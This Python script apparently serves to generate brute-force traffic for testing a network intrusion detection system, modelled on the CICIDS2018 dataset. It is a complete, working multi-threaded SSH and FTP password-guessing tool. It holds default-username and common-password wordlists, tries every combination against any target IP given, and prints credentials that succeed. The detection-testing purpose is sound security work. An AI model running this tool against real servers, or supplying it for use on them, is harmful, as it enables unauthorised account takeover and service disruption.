#!/usr/bin/env python
"""
Brute Force Attack - SSH + FTP (CICIDS2018 methodology)
Simulates Patator-style brute force attacks against SSH and FTP services.

CICIDS2018 used Patator with a 90M-word dictionary:
  - FTP-BruteForce: Feb 14 (10:32-12:09)
  - SSH-BruteForce: Feb 14 (14:01-15:31)

Should be detected as 'Brute Force' by your NIDS.
"""

import sys
import time
import socket
import threading
import itertools

try:
    import paramiko
except ImportError:
    print("[!] paramiko not installed. Run: pip install paramiko")
    print("[!] SSH brute force will not work without paramiko.")
    paramiko = None


# ======================================================================
# Common wordlists (expanded for realistic traffic generation)
# ======================================================================
USERNAMES = [
    "admin", "root", "user", "test", "guest", "ftp", "administrator",
    "oracle", "mysql", "postgres", "www", "backup", "operator", "service",
    "nagios", "dev", "deploy", "ubuntu", "centos", "pi", "sysadmin",
    "webmaster", "ftpuser", "anonymous", "info", "support", "manager",
]

PASSWORDS = [
    "password", "123456", "admin", "root", "12345678", "qwerty",
    "letmein", "welcome", "monkey", "master", "dragon",
    "login", "abc123", "111111", "mustang", "access", "shadow",
    "michael", "superman", "696969", "123123", "batman", "trustno1",
    "000000", "passw0rd", "iloveyou", "sunshine", "princess",
    "football", "charlie", "password1", "password123", "1234",
    "123456789", "0987654321", "test123", "toor", "pass",
    "changeme", "secret", "default", "administrator", "admin123",
    "P@ssw0rd", "Pa$$w0rd", "qwerty123", "letmein123", "welcome1",
    "Summer2023", "Winter2023", "Spring2024", "Fall2024",
    "company123", "server", "linux", "ubuntu", "password!",
    "12345", "1234567", "12345678", "123456789", "1234567890",
    "guest", "guest123", "ftp", "ftp123", "backup", "backup123",
    "test", "test1234", "temp", "temp123", "user", "user123",
]


# ======================================================================
# SSH Brute Force (Patator-style)
# ======================================================================
def ssh_brute_force(target_ip, target_port=22, duration=120, threads=4):
    """
    Patator-style SSH brute force attack.
    Rapidly tries username/password combinations against SSH.
    No artificial delays - aggressive like real Patator tool.
    Loops through wordlist repeatedly until duration expires.
    """
    if paramiko is None:
        print("[!] Cannot run SSH brute force - paramiko not installed.")
        return

    print(f"\n{'='*60}")
    print(f"Brute Force Attack - SSH (Patator-style)")
    print(f"{'='*60}")
    print(f"Target: ssh://{target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Threads: {threads}")
    print(f"Usernames: {len(USERNAMES)} | Passwords: {len(PASSWORDS)}")
    print(f"\n[!] Starting SSH brute force... (Your NIDS should show 'Brute Force')")
    print(f"{'='*60}\n")

    counters = {"attempts": 0, "successes": 0, "errors": 0}
    lock = threading.Lock()
    stop_event = threading.Event()

    # Create infinite cycling credential generator
    def credential_generator():
        """Cycle through all user/pass combos indefinitely"""
        while True:
            for username in USERNAMES:
                for password in PASSWORDS:
                    yield (username, password)

    cred_gen = credential_generator()
    cred_lock = threading.Lock()

    def get_next_cred():
        with cred_lock:
            return next(cred_gen)

    def ssh_worker(worker_id):
        """Worker thread that tries SSH logins rapidly"""
        while not stop_event.is_set():
            username, password = get_next_cred()
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    target_ip,
                    port=target_port,
                    username=username,
                    password=password,
                    timeout=3,
                    banner_timeout=3,
                    auth_timeout=3,
                    allow_agent=False,
                    look_for_keys=False,
                )
                # Successful login
                with lock:
                    counters["successes"] += 1
                    counters["attempts"] += 1
                print(f"  [SUCCESS] {username}:{password}")
                client.close()
            except paramiko.AuthenticationException:
                # Failed login - this is the normal case
                with lock:
                    counters["attempts"] += 1
            except (paramiko.SSHException, socket.error, socket.timeout, EOFError, OSError) as e:
                with lock:
                    counters["attempts"] += 1
                    counters["errors"] += 1
                # Small pause on connection errors to avoid overwhelming
                time.sleep(0.2)
            except Exception:
                with lock:
                    counters["errors"] += 1
                time.sleep(0.2)

    start_time = time.time()

    thread_list = []
    for tid in range(threads):
        t = threading.Thread(target=ssh_worker, args=(tid,), daemon=True)
        t.start()
        thread_list.append(t)

    try:
        while time.time() - start_time < duration:
            time.sleep(5)
            elapsed = time.time() - start_time
            with lock:
                att = counters["attempts"]
                suc = counters["successes"]
                err = counters["errors"]
            rate = att / elapsed if elapsed > 0 else 0
            print(f"[+] SSH: {att} attempts | {suc} success | {err} errors | {rate:.1f} att/s | {elapsed:.0f}s / {duration}s")

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        stop_event.set()
        for t in thread_list:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"[+] SSH Brute Force complete!")
        print(f"    Total attempts: {counters['attempts']}")
        print(f"    Successful logins: {counters['successes']}")
        print(f"    Time elapsed: {elapsed:.1f}s")
        print(f"{'='*60}\n")


# ======================================================================
# FTP Brute Force (Patator-style)
# ======================================================================
def ftp_brute_force(target_ip, target_port=21, duration=120, threads=4):
    """
    Patator-style FTP brute force attack.
    Rapidly tries username/password combinations against FTP.
    CICIDS2018 used Patator for FTP brute force on Feb 14 morning.
    """
    print(f"\n{'='*60}")
    print(f"Brute Force Attack - FTP (Patator-style)")
    print(f"{'='*60}")
    print(f"Target: ftp://{target_ip}:{target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Threads: {threads}")
    print(f"Usernames: {len(USERNAMES)} | Passwords: {len(PASSWORDS)}")
    print(f"\n[!] Starting FTP brute force... (Your NIDS should show 'Brute Force')")
    print(f"{'='*60}\n")

    counters = {"attempts": 0, "successes": 0, "errors": 0}
    lock = threading.Lock()
    stop_event = threading.Event()

    def ftp_try_login(target, port, username, password, timeout=3):
        """Try a single FTP login using raw sockets"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((target, port))

            # Read banner
            banner = s.recv(1024).decode(errors='ignore')

            # Send USER
            s.sendall(f"USER {username}\r\n".encode())
            resp = s.recv(1024).decode(errors='ignore')

            # Send PASS
            s.sendall(f"PASS {password}\r\n".encode())
            resp = s.recv(1024).decode(errors='ignore')

            # Send QUIT
            s.sendall(b"QUIT\r\n")
            s.close()

            if resp.startswith("230"):
                return True  # Login successful
            return False
        except Exception:
            return None  # Error

    def ftp_worker(worker_id):
        """Worker thread for FTP brute force"""
        cred_cycle = itertools.cycle(
            [(u, p) for u in USERNAMES for p in PASSWORDS]
        )
        while not stop_event.is_set():
            username, password = next(cred_cycle)
            result = ftp_try_login(target_ip, target_port, username, password)
            with lock:
                counters["attempts"] += 1
                if result is True:
                    counters["successes"] += 1
                    print(f"  [SUCCESS] {username}:{password}")
                elif result is None:
                    counters["errors"] += 1

    start_time = time.time()

    thread_list = []
    for tid in range(threads):
        t = threading.Thread(target=ftp_worker, args=(tid,), daemon=True)
        t.start()
        thread_list.append(t)

    try:
        while time.time() - start_time < duration:
            time.sleep(5)
            elapsed = time.time() - start_time
            with lock:
                att = counters["attempts"]
                suc = counters["successes"]
                err = counters["errors"]
            rate = att / elapsed if elapsed > 0 else 0
            print(f"[+] FTP: {att} attempts | {suc} success | {err} errors | {rate:.1f} att/s | {elapsed:.0f}s / {duration}s")

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        stop_event.set()
        for t in thread_list:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        print(f"\n{'='*60}")
        print(f"[+] FTP Brute Force complete!")
        print(f"    Total attempts: {counters['attempts']}")
        print(f"    Successful logins: {counters['successes']}")
        print(f"    Time elapsed: {elapsed:.1f}s")
        print(f"{'='*60}\n")


# ======================================================================
# Main
# ======================================================================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python 3_brute_force_ssh.py <TARGET_IP> [OPTIONS]")
        print()
        print("Modes (matching CICIDS2018 tools):")
        print("  --ssh           SSH brute force (default)")
        print("  --ftp           FTP brute force")
        print("  --all-brute     Run both SSH and FTP")
        print()
        print("Options:")
        print("  --ssh-port <PORT>   SSH port (default: 22)")
        print("  --ftp-port <PORT>   FTP port (default: 21)")
        print("  --duration <SEC>    Duration in seconds (default: 120)")
        print("  --threads <N>       Worker threads per protocol (default: 4)")
        print()
        print("Examples:")
        print("  python 3_brute_force_ssh.py 192.168.56.102")
        print("  python 3_brute_force_ssh.py 192.168.56.102 --ftp --duration 60")
        print("  python 3_brute_force_ssh.py 192.168.56.102 --all-brute --duration 120")
        sys.exit(1)

    target_ip = sys.argv[1]
    ssh_port = 22
    ftp_port = 21
    duration = 120
    mode = "ssh"
    threads = 4

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == "--ssh-port" and i + 1 < len(sys.argv):
            ssh_port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--ftp-port" and i + 1 < len(sys.argv):
            ftp_port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--duration" and i + 1 < len(sys.argv):
            duration = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--threads" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--ssh":
            mode = "ssh"
            i += 1
        elif sys.argv[i] == "--ftp":
            mode = "ftp"
            i += 1
        elif sys.argv[i] == "--all-brute":
            mode = "all"
            i += 1
        else:
            i += 1

    if mode == "all":
        per_attack = max(duration // 2, 30)
        print(f"\n[*] Running SSH + FTP brute force, {per_attack}s each ({duration}s total)\n")
        ssh_brute_force(target_ip, ssh_port, per_attack, threads)
        time.sleep(3)
        ftp_brute_force(target_ip, ftp_port, per_attack, threads)
    elif mode == "ftp":
        ftp_brute_force(target_ip, ftp_port, duration, threads)
    else:
        ssh_brute_force(target_ip, ssh_port, duration, threads)
